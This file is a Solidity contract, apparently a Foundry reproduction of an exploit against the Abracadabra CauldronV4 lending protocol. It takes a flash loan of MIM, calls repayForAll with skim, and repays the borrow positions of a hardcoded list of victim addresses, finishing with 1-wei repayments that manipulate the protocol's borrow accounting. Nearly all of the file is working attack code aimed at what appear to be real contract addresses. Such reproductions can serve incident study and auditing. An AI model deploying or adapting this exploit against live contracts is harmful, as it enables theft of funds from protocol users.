pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /// @notice EIP 2612
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IFlashBorrower {
    /// @notice The flashloan callback. `amount` + `fee` needs to repayed to msg.sender before this call returns.
    /// @param sender The address of the invoker of this flashloan.
    /// @param token The address of the token that is loaned.
    /// @param amount of the `token` that is loaned.
    /// @param fee The fee that needs to be paid on top for this loan. Needs to be the same as `token`.
    /// @param data Additional data that was passed to the flashloan function.
    function onFlashLoan(
        address sender,
        IERC20 token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external;
}

interface IDegenBox {
    function flashLoan(
        IFlashBorrower borrower,
        address receiver,
        IERC20 token,
        uint256 amount,
        bytes calldata data
    ) external;

    function deposit(
        IERC20 token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4 {
    struct Rebase {
        uint128 elastic;
        uint128 base;
    }

    function totalBorrow() external returns (ICauldronV4.Rebase memory);

    function repayForAll(uint128 amount, bool skim) external returns (uint128);

    function userBorrowPart(address) external returns (uint256);

    function repay(
        address to,
        bool skim,
        uint256 part
    ) external returns (uint256);
}

interface ICurve {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy,
        address _receiver
    ) external returns (uint256);
}

contract AbracadabraExploit is IFlashBorrower, Test {
    address CauldronV4 = 0x7259e152103756e1616A77Ae982353c3751A6a90;
    address MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address DegenBox = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;
    address MIMApe = 0xf35b31B941D94B249EaDED041DB1b05b7097fEb6;

    address zerox193 = address(this);

    function exploit() external {
        IDegenBox(DegenBox).flashLoan(
            IFlashBorrower(address(this)),
            address(this),
            IERC20(MIM),
            300000000000000000000000,
            "0x"
        );
    }

    event Reached(string);

    address[] arrayVictim = [
        0x941ec857134B13c255d6EBEeD1623b1904378De9,
        0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2,
        0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc,
        0xc3Be098f9594E57A3e71f485a53d990FE3961fe5,
        0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D,
        0xe435BEbA6DEE3D6F99392ab9568777EB8165719d,
        0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5,
        0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34,
        0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7,
        0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881,
        0x3B473F790818976d207C2AcCdA42cb432b749451,
        0x48ED01117a130b660272228728e07eF9efe21A30,
        0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1,
        0xD24cb02BEd630BAA49887168440D90BE8DA6708c,
        0x0aB7999894F36eDe923278d4E898e78085B289e6,
        0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A
    ];

    uint256[] userBorrowPartEach;

    function onFlashLoan(
        address,
        IERC20,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        emit Reached("Inside onFlashloan");

        IERC20(MIM).approve(DegenBox, 2 ** 256 - 1);
        emit Reached("Approved Mim->Degen");

        IDegenBox(DegenBox).deposit(
            IERC20(MIM),
            address(this),
            DegenBox,
            8894382279231396727995,
            0
        );
        emit Reached("Deposited in DegenBox");

        IERC20(MIM).transfer(CauldronV4, 240000000000000000000000);

        emit Reached("Transfered to CauldronV4");

        ICauldronV4(CauldronV4).repayForAll(240000000000000000000000, true);

        emit Reached("RepayForAll to CauldronV3");

        for (uint256 i = 0; i < arrayVictim.length - 1; i++) {
            uint256 temp;
            temp = ICauldronV4(CauldronV4).userBorrowPart(
                payable(arrayVictim[i])
            );
            userBorrowPartEach.push(temp);

            emit Reached("Fetched userBorrowPart for curr Victim");
            ICauldronV4(CauldronV4).repay(
                arrayVictim[i],
                true,
                userBorrowPartEach[i]
            );

            emit Reached("Repayed for curr Victim");
        }
        emit Reached("Covered the first loop to repay all");

        ICauldronV4(CauldronV4).totalBorrow();

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            126989589381283599649734
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit Reached("Repayed for last Victim with part total - 100");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit Reached("Repayed for last Victim with part 1 first");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );

        ICauldronV4(CauldronV4).totalBorrow();

        emit Reached("Repayed for last Victim with part 1 second");

        ICauldronV4(CauldronV4).userBorrowPart(
            payable(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A)
        );

        ICauldronV4(CauldronV4).repay(
            0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A,
            true,
            1
        );


        ICauldronV4(CauldronV4).totalBorrow();

        emit Reached("Repayed for last Victim with part 1 third");
    }
}
